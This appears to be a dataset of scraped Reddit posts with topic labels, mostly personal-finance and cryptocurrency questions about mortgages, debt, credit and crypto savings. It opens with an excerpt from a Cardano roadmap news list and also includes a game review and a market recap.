12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.  
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this. 
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting. 
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

Bitcoin,Why would you ever sell?,"After watching this video (Mark Moss)... [https://www.youtube.com/watch?v=OvAEQhbuvMI](https://www.youtube.com/watch?v=OvAEQhbuvMI)

I looked up one crypto lender's fees to borrow against your hodlings (2% origination, w/ 4.5% APR) and created a simple spreadsheet to compare the two strategies.

Let's assume:

\-  your bitcoin reaches $1M value.  
\- capital gains upon cashing out = 35% (if you live in CA like me)  
\- you spend $100k year to live

Strategy A) ""Cash out"", pay capital gains. Live off what remains.

Strategy B) Don't sell. Instead, borrow against hodlings each year, and pay off prior loan as bitcoin rises.

With almost all realistic numbers (e.g. interest rates rising to 15%, bitcoin returns as low as 2%)... Strategy B wins hands down in preserving your wealth.

I've seen many people announce moon on this forum ""I cashed out and paid capital gains"". So, I hope others find this comparison as eye-opening as I did.",cryptocurrency

Bitcoin,Bitcoin Changed My Life ... And Not In The Way You Think,"So this is a bit of an update ...

I responded to a post here back in early January. As I said then, I've been lurking for a while, and recently decided to take the toe dip into crypto.

An old friend, a brother really, was into BTC early. He was on the Silk Road, and at the time, was trying to convince me to buy bitcoin to ... manage funds ... Ultimately, I was so fucking mad at him for using - and also ruining our then recent start of a band - that everything he told me about the scam of fiat, government control, and how bitcoin was a path to freedom, went into my eardrums, but I didn't hear any of it.

I will never forget driving to and from the only bitcoin ATM around the Seattle area. I was furious. It wouldn't have mattered what he said, or how he said it. My friend was ruining his life, and this ""bitcoin"" was just a means to that end. 

""Whatever you do, just buy Bitcoin"" ... I was there, he said it ... But I didn't listen ... All I heard was a junkie who had taken over my friends body, trying to convince me he was justified. I had never been filled with that much anger. We broke apart and went our seperate ways shortly thereafter.

Skip to 8 years later.

I never forgot about bitcoin. Even joined this sub and just read posts. I never invested in anything, even though I knew I probably should. Ultimately, I went through my own shit, and my own addiction: alcohol. We lost a dear friend to suicide in 2020.

GME ensues. I follow. I don't invest but I follow.

Something inside of me grew angry. These fuckers ruined my parents lives, ruined friends lives, and got away scot free. Something, idk what, reminded me of that car ride ... I came back here and was sent into a whirlwind of crypto research. 

I knew after a couple days that I had to buy bitcoin. But, I have debts still. Not terrible interest rates, but debt nonetheless. I posted a question here: ""Should I pay off my debts before investing in crypto?""

... Well, I decided to dive in. What's the worst that could happen? I'll own BTC, like I know I should've all along. The debts can wait, I thought. Worst case, I pay them off a few months later than planned.

Today, 3 months later, my life has totally changed. 

Have i made life changing money? No. Definitely not. But my gains, SMALL as they may be ... Have OUTPACED my debt interest ...

Have i saved money? Absolutely. And I have a bigger amount of savings, and in my eyes, opportunity driven wealth in BTC, than I ever have before.

Most of all? ... I can now say I am not drinking every day! Not even every week!

For the first time in a few years, and mostly since my friend took his own life, I'm hopeful. Hopeful ... And .. goddamned stoked on something. Not just for me, but for all of us ...

I know this was long, and maybe no one reads this far ... But thank you all ... Thank you all for being so bold as to keep this thing alive. Either from the early days, or just starting now. I am so grateful.

I am a better person today because of Bitcoin.",cryptocurrency

personalfinance,Take the credit or buy the points?,"My wife and I put in a successful offer on a home and the mortgage company is giving me the offer of taking the lender credit or buying points. Buying the points means paying more at closing (\~$1500 more) but then having a monthly payment about $40 lower than if I take the lender credit. It also means my interest rate will be 3.125% rather than 3.25%. I'm paying the PMI up front and can comfortably pay the higher closing. I don't see why I shouldn't buy the points if it means a lower monthly payment, but I'm curious if I'm missing something because I've never bought points in the past. We're planning to stay in this home for at least 12-15 years.",finance
personalfinance,Cash out retirement account early to pay off credit cards?,"I want to make sure I’m making a good decision here. I intend on cashing out my TSP (like a 401k from when I was in the military) to pay down some of my credit card debt. It’s obviously a big decision, so I thought I’d check.

Specifics:

$27000 in credit card debt that has around a 20% interest rate which means I’m paying around $500 a month in interest. The reason I got into that debt isn’t really important but it is worth noting that I’m on a much better financial path in my life now and I have a concrete plan to pay off all the debt in a little over 3 years.

The problem I’m running into is that I want to buy a house in a year or two and my credit is obviously not ideal. This is partly due to some serious delinquencies a few years ago as well, so it won’t fully recover for another 5 years, but slashing my utilization will probably help a ton - at least to get my score up to be approved for a legitimate mortgage. 

Additionally, if I had that extra $500 from interest back, I would be able to max out my retirement accounts going forward without the debt. I’m 30 now and have a decent amount of time to make up for this move, and I think the math works out. 

My retirement account is currently worth $18400. $14000 in a Roth and $4409 in a traditional. My plan would be to withdraw it all, take the penalties, and have around $15000 to pay to my highest interest card. This would allow me to pay off my cards completely around a year from now. Once those cards are fully paid off, I’ll have enough per month to max out my retirement and then some.

Is this the right move?",finance

Bitcoin,A different way to view your Bitcoin balance,"People talk often about having some percentage of the total bitcoin supply, such as 21 BTC being 1 millionth of the total supply, but I want to promote a different way of viewing amounts of Bitcoin.

Time is money is an old adage that is covered quite thoroughly in *The Bitcoin Standard* by Saifedean Ammous.  He posits that the only truly scare resource (prior to Bitcoin) was human time.  Now we can add Bitcoin to that short list of scarce resources, but perhaps we also need to add Bitcoin blockchain network time.

When the Bitcoin network was young there was very little value in bitcoins and they flowed freely, being given away up to 5 at a time from faucets and being offered for sale at 10,000 for $50 without any buyers coming forward, 10,000 BTC for a couple of supreme pizzas.  In that epoch the block subsidy was 50 BTC every 10 minutes.  We can consider 10 minutes of Bitcoin network time to have been worth about 50 bitcoins in the period prior to the first halving. Now that we’ve had three halvings the block subsidy is only 6.25 BTC every 10 minutes.  Transaction fees are added to the block subsidy, but transaction fees usually total between 0.5-1.1 BTC at this time.

As time is a scarce resource both for humans and the Bitcoin blockchain, I have stopped thinking in terms of total supply and started thinking about my Bitcoin balance as a claim on ownership of blockchain time.  If someone had 50 BTC from the first epoch that would have represented 10 minutes of network time, but that same 50 BTC now represents 80 minutes of network time on the most powerful computer network in the world.  After the next halving, it will be 160 minutes, then 320, 640, 1280, etc.

In the last epoch in which there is a block subsidy (about 2136-2140 Anno Domini) only 0.00216 BTC will be created in the entire 4 year period.  If you own ~0.002 BTC you own the entire network production for that 4 year period.

Before anyone mentions it, yes, I realize that long before that epoch the network will be incentivized far more by transaction fees than block subsidies.  In fact, the change from block subsidy to transaction fees as the main source of network funding will occur no later than 2032 when the average transaction fees will outpace the block subsidy, which will drop to 0.78125 BTC.

I am posting this to give people hope who are feeling left behind because a whole coin is out of reach for so many.  Maybe you’ll never get to a whole coin, but can you get to 0.05?  Because that is more than the block subsidy will be between 2048 and 2052. If you have 0.05 you own 10 minutes of the Bitcoin's network time in 2048.

Stop thinking in percentages of the total supply, and think about building your claim on the network’s time.  It’s a happier thought, provides more achievable goals, and it’s cool to think about having control over the time of a network as dispersed, diverse, and decentralized as Bitcoin.

Block subsidy schedule through 2052:

2009-2012: 50

personalfinance,Investing For Retirement Health Insurance For Younger Chronically-Ill Wife,"Hello.  My wife is 10+ years younger than me and has a chronic health condition that requires expensive drugs to treat and many office visits and tests every year.  She does not work and is currently supported by my employer's health insurance through me. We don't have an HSA since the out-of-pocket costs for a high-deductible plan would be prohibitively high for us.  I'm 50 and would like to retire around 60-62 if possible, so we would be purchasing private health insurance for a few years for me and many years for her, before qualifying for Medicare.

The only good investment strategy I can think of for this situation, besides trying to save as much as possible, is to keep our MAGI below the 'subsidy cliff' (4x poverty limit) after I retire by putting as much as possible into ROTH options for the next 10-12 years, so we qualify for private exchange Federal subsidies, to assist us with getting better health insurance (silver or gold level).  It's also possible that the 'subsidy cliff' might disappear in the future, since it was just cancelled by Congress for 2021 and 2022 as part of the Covid relief bill.

solar,Should we hop on the Solar Coaster? Someone convince me why adding solar to my residential property right now is a bad idea.,"All I am seeing is reasons to do it. I’ve always believed anything too good to be true probably is.

However, I’ve received multiple sub 30k quotes (after fed and state incentives) for a 17kWh system with 400 watt panels and micro inverters that can one day incorporate a battery when the tech is there. Financing under 1%. And a free 200a panel upgrade that I’ve received multiple quotes for coming in around around 5k from local electricians. On top of that, we believe generally being energy self sufficient imparts a net positive impact on the planet. 

One reason I see - We own the home and will likely sell it before the end of the loan. Perhaps someone wouldn’t want to buy an “iPhone 7” with only 1 camera in say 2034 when we sell when the latest and greatest “iPhone XX” has 18 cameras and is the size of a thumbnail...or in this case it’ll probably just be 800watt solar shingles that you can sell digital ad space on.

personalfinance,Refinancing or second mortgage prior to impending move?,"Location: Cheyenne, WY  
In 2013 we purchased a house under an initial mortgage of $185,000, and have been making regular payments on it since. Now, however, the housing market in Cheyenne has shot up sharply, and our house's market value is around $297,000 before considering any of the work we have put into it (a refinished restroom and liveable attic space, as well as work in the kitchen and minor work in other areas).   
We are planning on moving in about a year to an area with a much more buyer-friendly market, and are planning on selling our house sometime next summer, but have other, more immediate financial needs which we would like to use the equity we have put into this house to help cover.    
Given these circumstances, would it be better to refinance our house or to take out a second mortgage? I understand that refinances have a higher closing cost and lower monthly payments but could cause us to forfeit our current interest rate (around 4%), while second mortgages are generally more costly long-term but allow us to use the equity we have in the house without changing the terms of our initial mortgage, but with the number of variables involved with our current situation it is just overwhelming to try and figure out which option is best.   
Whichever route we go with, are there certain companies that would be a better option? Is that something which would likely be applicable on a large scale, or is it too specific to our location that we would need to get in touch with local professionals?",finance

I have $40k in debt, cosigned by my parents. they are unable to cosign any more loans, that would mean another 2 years of school and i don’t know how to pay for it.

i really want to build take semester/year off to learn CS on my own and find out if it’s really for me. if that’s the case i want to build up my portfolio of work to show off for potential employers and potentially land a job that will pay for me to finish my degree. the only issue is the grace period on my student loans will expire after 6 months as they’re mostly private loans. i can earn enough working in the meantime to pay rent every month but once the grace period ends i‘d be screwed.

i truly feel like the student debt bubble is going to burst because the cost of tuition does not represent the value of a bachelors degree in today’s job market. CS majors usually end up with one of the highest starting salaries of any field and my debt would still be a huge burden for the first few years after graduating.

am i completely wrong? i know interest rates could be a huge factor if the change but i don’t understand how

edit: if i apply for jobs showing that i’ve started my degree and want to finish it does that look bad to employers hiring? would they want to see my transcript or care that I’ve failed a programming course twice?",finance
personalfinance,Any reason to not refinance. FHA to conventional.,"Hello everyone looking for advice. I bought my first house for 250k (3.375%) like 19 months ago and ive been loving it. I went with an FHA loan due to the down payment issues and not having enough. My mortgage right now is 1800 a month. I pay 170 in PMI monthly which is in that monthly. I was looking into refinancing to try to remove that PMI, but my equity or the ratio is not 20% so even if I go to conventional I will have to pay PMI until I get above 20% owned.

I had my current provider do some numbers and they can drop my monthly to 1508, keep it at 3.375. The PMI will go from 170 to 90. The closing costs of 2.4k is included in that monthly and I do not need to do an appraisal. 

My though is that if I keep my current FHA loan, I can never get of the PMI and if interest rates go up in a few years when I do refinance, ill be above my current 3.375, so i might as well refinance today?

Is there anything that Im missing? Im guessing the drop in the monthly us that I already paid for almost 2 years and I will start back at 30 years. I think my biggest goal is to just get rid of the PMI, as it is such a waste of money.",finance
gaming,Why is the team that nerfs things always much more efficient than the team that fixes things?,All the time these new games are coming out broken and before they get fixed several exploits get removed and things get nerfed. When people ask why the usual response is that it's just two different teams. Couldn't they just rebalance the teams? I legitimately don't know. I assume it must be much easier to nerf than to fix?

personalfinance,Mistakes I made during my home refinance process,"I recently started the process of refinancing my house and made some mistakes. I know some of these things are obvious, but I thought I'd share the lessons I learned in case it helps anyone.

- Decide where you're going to keep the closing costs and keep them there until closing.

I was asked for documentation related to the source of the funds I would use for the closing costs. I had my funds in a savings account, so I provided my statements for that account. However, this particular bank doesn't make it easy for you to do external transfers, so I thought I'd get ahead of the curve and move the funds to my checking account where transfers are easy. This meant I now had to provide more documentation on the other account and the transfer. 

- Don't make any unnecessary changes to other loans during the refinance process.

I had a separate loan from a bank for a solar panel installation. They had a lien on my property. This is fine, and the mortgage company will allow the lien to stay if you do a ""lien subordination"" (they want to make sure they get paid first). The solar loan bank (NBT, you suck) was being difficult in getting me the necessary documentation for the lien subordination. I got frustrated and said ""fuck it, I'll just pay off the solar loan"". Big mistake. This meant that instead of a couple of weeks to get the lien subordination sorted out, I had to wait for a month for them to get me a copy of the lien release letter they send to my county. I now also had to provide more documentation on the funds I used to pay the loan.

- Make sure you don't have any major life changes coming up before you refinance.

A week into starting the refinance process, I decided I hated my job. I had been feeling like this for a while, but I finally had enough and decided I wanted to quit. However, quitting would throw a major wrench into the refinance process, with the possibility of being denied and actually losing some of the money for the closing costs. I realized I had no option but to suck it up.

In the end, any issues were worth it. I'd strongly suggest people who are still paying PMI (private mortgage insurance) to look into refinancing. I was able to lower my interest rate, shorten my loan term AND remove PMI which will save me a ton of money long term.",finance
personalfinance,Looking to increase my credit but it doesn't seem to be going anywhere. Just looking for some advice.,"Hey all,

I've been lurking around these pages for a little while now trying to get some information and reading people's personal success stories. All have been great and I thank everyone for being so responsive to others.

So a little about me...

- 28 years old

- 80k/yr

- FICO score (taken from discover) is at a 710 

- Credit Karma is saying around 740 (from reading through reddit, this score seems to be almost a joke and shouldn't really be used. Kind of use as a tool)

- Student loans 17k remaining (paid off roughly 12k during the pandemic, mostly on the private loans. So only have federal remaining which aren't currently accruing interest. I'm kind of waiting to see if there is any kind of debt forgiveness come later in the year or next. Not holding my breath... Otherwise, I have enough in savings to completely pay off the remaining balance when interest does start to kick in. 
I also have about six loans there that were 90 days delinquent from almost three years ago. I was leaving for a military deployment and was under the assumption my payment pause was in affect. I was sadly mistaken. Other than that, I've been an on time payer all other times.
 I have enough in savings to completely pay off the remaining balance when interest does start to kick in)

- Bought a brand new car (22k) last year but paid it off last month (so about four years early)

- Currently have two credit cards, one limit 2500, the other 2100. I pay those two credit cards off 100% bi-weekly.


I'd like to pay off my student loans first and look into buying a house in probably two years once I get my savings back to where I feel comfortable. Considering student loans and my car had the majority of my debt, would paying everything off ultimately hurt me with my score? I understand not paying interest is the way to go, just curious considering my credit limit is pretty low. 

I'd be curious what would be some smart moves to increase my score. I'd like to see it north of a 740 in two years for when I do start looking to buy a house. 

Thanks and look forward to hearing from you guys!",finance
personalfinance,"$10,000 judgment from Discover credit. Negative mark on credit report will expire in 2 years. Best way to negotiate? Received offers for them to pay $4000, but can't afford. What to do?","28 year old/female here. I got laid off due to COVID, and currently on pandemic relief. I have roughly $10,000 credit in debt that I stopped paying in September 2015 to Discover Credit for a credit card (no third party collection agency). I got a judgment in New York in 2018 which lasts for 20 years in NYS. I believe that if I ever go for a car loan or mortgage this judgment may pop up and give me bad interest rates and they can also go after any assets if they can find them. Thus, I want to pay it off and negotiate a lower price.

So the question then is - do I have a better negotiating angle with Discover Credit if I pay it before or after if the debt is set to fall off my credit report on March 1, 2023 (7.5 years after the deliquency) which is about 2 years from now? They have already sent me an offer to pay it for $4000 over the last few years but wondering if I can settle for lower due to it falling off the credit report. I do not have the money to make monthly payments for any judgment right now and am barely making ends meet for rent, and other expense at the moment, and it will be years before I get a home, and I have a reliable car, so I can wait if I need to but I would like to get it settled when I can afford to.",finance
gaming,"I played ""The Thing"" game (2002)","The game was a really bad execution of ""the thing"" genre. Basically it was a body horror shooter (dead space 3) with few elements of actual suspicion of allies.

I never had a problem with my allies being suspicious of me and fear was only ever a nuisance. I never needed to use the adrenaline shot to stop their fear because it would eventually go away. I never needed to give them stuff to make them trust me other than to make them more combat capable. I think there was a monster infection mechanic but it was super weird. I found at least one transformation trigger that always turned an ally into a monster regardless of whether you tested them or not. I literally tested this dude who came up as negative for infection. Two seconds later, I walk through the doorway, and he turns into a thing monster. Absolutely stupid. It's like the test is completely worthless because it doesn't matter if you walk through a monster trigger.

As stated, the game is more of a shooter than anything else. Allies are just useful for some skills but they don't die easily and are alright as fighter ai. But as the game said ""their living breathing people who can become suspicious of you"". This is a complete lie, they are simple bots with simple thoughts. ""He give me gun, he is ally. He heal me, he is friendly. He treat me like bullet sponge for enemy, no thoughts. He get hurt and could be infected, ooh nevermind we're just going to ignore that part"". They are so easy to manipulate and make friendly. Like I said, I never had trust or fear issues with them because there were too few factors to lower their trust. They would always be trustworthy of you up until they turned into a monster, which was an inevitability.

Also, there was a mechanic where you were supposed to be suspicious of each other and worry that someone is a monster and is going to sabotage. That was never a problem for two reasons. One, ally things were never hard to kill and rarely ever hurt me or my allies because they were the basic enemy. There were much harder bullet sponges to kill than them. This is a huge problem because it makes suspicion such a background issue. I often watched my friends turn into monsters and think ""Oh, he's a thing, guess we just lost an ally and a gun. Oh well, let's shoot him."" The second problem is that ally things don't sabotage your team. I don't have to worry about what my allys are doing to my team because every ally thing acts completely competent and normal until they become a thing monster. If I knew who was a thing monster immediately, I would never kill them because I knew they would still function as allies until they turned. AND I STILL HAVE TO KILL THEM ANYWAY. There's no reason to worry about them up until that point! I HAVE NO REASON TO WORRY ABOUT MY ENTIRE TEAM BEING MADE OF MONSTERS BECAUSE THEY DO THEIR JOBS!!! There is so much wrong with that.

How to remedy: Make trust a difficult thing to hold. Make giving weapons to people only worth a little bit and make trust degrade over time. Making it something you constantly have to prove to your allies that you're not a thing monster and that you're not an enemy. It's worth something for you to give me a pistol when you have a shotgun but you can still shoot me if you want. But if you give me the only gun you have, then that's something more.

Second, remove a lot of the larger monsters or make the ally thing monsters much harder to kill. Without completely changing gameplay, it makes sense to make the ally things more scary than just a mid-difficulty enemy.

Finally, the game is completely scuffed from the start. The thing is supposed to be about fear, suspicion, trust and loyalty and if that loyalty or trust is misplaced. There shouldn't be 20 man shootouts where allies and enemies are knowable solely from outfit. There shouldn't even really be guns! Just 10 men, a flamethrower and a monster that wants to kill them all. The thing game is not about the thing. It has nothing to do with the movies and what John Carpenter wanted out of the movies. Hell, the 2011 movie was 10 times more faithful to the story than this game could ever be! Too many underused mechanics and too many guns and fighting. I feel like a dedicated modder could use the game engine to make an actual game of suspicion and make something that the thing was really about.

You could even make a game like the thing movies. It's literally ""Among Us"" minus the cartoons and plus the body snatching. You can make a single or multiplayer game where you're on a frozen over research base with 10 other people (ai or person) and you all know about the monster and are unsure who is one. ""I'm not the monster, and why are you accusing me? How do we know you're not the monster and that you aren't trying to get everyone else killed?"" It's perfect! Bonus if singleplayer has the player not knowing if they're the monster and accidentally winning the game as the monster. The only problem being that such a game would have a lot of graphical fidelity and monster animations.

I'm really just here to complain about what they did with the thing game (2002). If I wanted a shitty shooter game, then I would have many, many choices. There are few, if any games that are similar to the thing movie plot and that really sucks.",technology

stocks,"Here is a Market Recap for today Friday, April 9, 2021","**PsychoMarket Recap - Friday, April 9, 2021**

Stocks traded higher in another record-setting session in the market. The S&amp;P 500 (SPY) and Dow (DIA) both recorded new intraday highs and the tech-heavy Nasdaq (QQQ) kept building on recent momentum. Market participants continue to digest remarks from members of the Federal Open Market Committee (FOMC) and Federal Reserve Chair Jerome Powell. 

The equity market got a boost after FOMC members signaled in their March meeting that the Fed continues to favor maintaining highly accommodative monetary policies for the foreseeable future and signaling they will hold off on tightening policy at the first sights of inflation. Jerome Powell reiterated that the Federal reserve was looking for “actual progress rather than forecasts” to before the Central Bank considers tightening monetary policy. Moreover, Powell highlighted the uneven recovery in the US labor market as a sign the economic recovery still has a ways to go in order to meet the Federal Reserve’s employment goals. He said “The recovery though here remains uneven and incomplete. Tee burden is still falling on lower-income workers. The unemployment rate in the bottom quartile is still 20%. There are still eight and a half million people out of work. This unevenness that we’re talking about is a very serious issue.” 

Treasury yields have come back down some, hovering at 1.66% at the time of writing, as fears over a near-term policy shift by the Federal Reserve dissipated, prompting market participants to rotate back to growth and mega-cap tech stocks, with Alphabet (GOOG), Microsoft (MSFT), and Facebook (FB) reaching new intra-day records. Colleen MacPherson, Penobscot Investment Management portfolio manager said, “We’ve seen this rotation into more value-oriented names from growth to value, but as we enter into earnings season, we anticipate growth names to see somewhat of a rebound because we expect strong earnings coming out of the growth names. But overall, I think the trend into value, small caps, more cyclical names will continue as the economy reopens and more people are inoculated and we get back to normalcy.”

Looking ahead, market participants will be closely monitoring the upcoming earnings season for the first three months (Q1) of 2021. Over the past several weeks, analysts have raised their earnings estimates by record levels with the expectation that recent economic growth will drive corporate earnings higher. According to FactSet, first-quarter [earnings estimates were increased by a record margin of 6%](https://insight.factset.com/record-high-increase-in-sp-500-eps-estimates-for-q1) over the past several weeks, as analysts adjusted their forecasts for the much stronger-than-expected economic rebound seen so far. Omar Aguilar, chief investment officer at Charles Schwab said, “We’re still in probably the early parts of the expansionary cyclical after recovering from that recession. We’ve started to see cyclical trades playing a big role in the early part of the cycle. Normally what happens at this stage is you continue to see … the cyclical component will continue to drive leadership into the second part of this year into next year.”

personalfinance,Would it be wise to use a Vanguard VTSAX Mutual Funds Account as a High-Yield Savings Account?,"I have a reasonable amount of money that has been sitting in my savings account for several years now. Much of it was in a CD when the interest rates were in the 2-3% range, but most are now starting to end soon. With interest rates so low and even when they were higher, but esp now that they actually are low, I'm considering to just move everything and buy a bunch of total market and S&amp;P 500 funds and use it as a super high yield savings account. 

I'd normally use the money to buy individual stocks, like most of last year, but true answer right now I don't find anything in the stock market interesting, beyond what I already own, and not sure I want to just sit on the sidelines holding cash, so contemplating just putting it all in large mutual funds, and calling it as a peace of mind. It probably won't make a ton, compared to individual stocks, but I feel even 5% within a year is better than 0.3% in most of today's savings account. I already have enough savings to last about 1-year parked on the side, and don't feel like any of the large mutual funds should crash like back in March 2020 anymore from here, so should be incredibly safe, and even if it did, it'd actually just be even better and perfect, now for buying opportunities once again, another chance to now correct anything I wish I did back then, so wondering if it's worth the move?",finance
personalfinance,Is paying 1750 a month too much rent in my situation?,"So i live in CT and rent is really expensive.  I live with my fiancee and we have a medium sized border collie. We are both 23, I’ve been with my career for 2 years now and she is just starting.

The dogs size is the issue and reason we can’t get into a lot of apartments. I would like to live cheaper and really wish I could buy a condo or a house right now but the market is not favorable. 

Currently there is a listing for $1750 for a 1 BR 1 BA apartment in a much quieter part of CT thats closer to work than where I am now. We would have to pay for all utilities and an amenities charge of about 60 dollars as well which will come out to about 2100 in total per month (high side estimate). We bring home a net monthly pay of $5800.

I know we can swing it but at the same time I have 70K in student loans I’m trying to pay off in the next 5-8 years. The loans are set on a 10 yr fixed rate of about 2.9 pct. Total monthly payment (private + fed) = $802. I’m very laser focused on eliminating debt which is why I paid off my car (11K) and about 10K of student debt in the past year. 

I’m stuck in a rock and hard place right now. I’m not sure if I can meet my goals and pay for this apartment at the same time. But, I also might be homeless in 2 months if I can’t find a place that allows my dog. Searching around I don’t see many places which allow dogs that aren’t at least 2 grand a month. I don’t have contact with my family and my fiancees family doesn’t have the space to  house us for a few months. 

This place really popped out for us and the application process was great. The place has a dog park, pool , hot tub and gym and is very quaint and friendly. 

I don’t know if its because i’m more just use to living in  the congested no so great city suburban parts of CT, and thats why I am uneasy about signing on and going in with this lease. But it seems like a lot of money a month to be putting in on rent when I have a lot of other debt to clear up in order to be financially independent and able to put down for a house. 

So what do you all think? Should I sign a lease and live in this complex maybe for a year or so? 

If you’re wondering why I’m leaving my current apartment- 
My landlord seemed like a sweet lady who was well organized but really she is ridiculous. She charges us for little things that a landlord should cover and if i really wanted to I could fight the charges but we don’t have a lot of past landlord history to vouch for us so I’m trying to stay on her good side so she can at least give us a good reference. But I just have a bad feeling about her and feel she puts too much liability on her tenants.",finance

personalfinance,"Looking into a re-fi, could use another set of eyes","Like many people have done within the last year, I am considering refinancing my mortgage. I do have one consideration that makes my situation a little different than a traditional refinance and I wanted to have people check my numbers, or at least my logic.

When I purchased my home I did so using a first-time homebuyer program administered by the county I live in. They gave $15,000 in down-payment assistance in the form of a bond that is forgiven at 20% of the original value per year. If you sell the home or refinance you have to pay back the balance of the bond. Since I have owned over 3 years the balance is $6,000

Taking this into consideration as well as closing costs and PMI I am currently paying I wanted to look at the numbers when everything was taken into consideration. Sure, a lower interest rate will equal lower payments and I will avoid PMI, but will it offset other costs?

To make things fair I did a scenario of both paying closing costs and the balance of the bond up front and one where they would be rolled into the principal. The likely scenario is that I will pay part of each out of pocket and roll the rest, probably about 50/50. I used a standard amortization calculator for the total loan cost calculations. 

I chose a 3.25% rate which seems competitive but not aggressive. Given my credit score (\~840) and other ratios like debt/income I should be able to get pretty much whatever the best rate going is. 

Any/all input is appreciated.

CryptoCurrency,Traditional fiat high yield savings accounts seem pointless after I discovered crypto interest accounts.,"A quick backstory of myself. I've been into crypto since around 2013 but have been in an out of the space due to financial struggles. Dogecoin was my first love and the community resonated with me more than the money aspect of it. I mined probably over 1.5M dogecoin over a year or two and forgot about it in a wallet after a ton of life changes. I came back in 2017 during the boom and cashed out most of it well before the spike, assuming the price wouldn't go any higher... It did, but oh well. From here I took the remaining coins and sold them for a fraction of a Bitcoin which I again forgot about due to more sudden life changes. I have a bad habit apparently.

Fast-forward to Jan 2021 and I rediscovered my crypto and fell down the new and improved rabbit hole of crypto. I know it's easy to make money in a bull run like we have now, but I'm proud of a few well timed trades that have gotten me some really good returns. It's gotten to a point were I have more than I've ever had, which isn't much sadly, but now I don't necessarily want to trade but go back into full HODL mode while investing my own money over time. I could just sit on my coins, put them in a wallet and wait, but instead I decided to see what option there were out there and I'm happy I did.

I use the Brave browser and they often have crypto based ads which is what led me to discover crypto interest accounts. These accounts are absolutely insane! I started a separate savings account in a ""high yield"" online savings platform using fiat and I was originally getting I think about 3% which has since fallen to 0.5%. I've maybe made about $10-15 off that in interest over the years total. I've recently put all my crypto into one of these crypto interest accounts AND converted my vacation savings into stable coins to get 8.6% APY on that! I've made well more in interest in a few weeks than I did in years in my other account.

I don't know how long these interest rates can last, and they might one day fall to the same levels of these fiat high yield accounts, but is there any downside to just using these as long term savings accounts? I won't be keeping my emergency funds in there of course since I can't get the money back immediately, but for all other intents and purposes I don't see a downside right? I'm aware of the lack of FDIC insurance and liquidity issues the platform may have if there is a huge hack, but that seems unlikely since most funds are kept in cold storage.

I'd love to see some discussion and other viewpoints on this!",cryptocurrency
personalfinance,"Preparing for an FHA loan, 15-year vs 30-year giving me lots of anxiety.","Orlando, FL

I'm pretty anxious about my FHA options when it comes to 15 vs 30. The interest rates are lower on a 15 but even if I rented out all but my room the monthly premium would still be pretty high, and that's coming from someone with a DTI of 21% and nearly-800 credit...

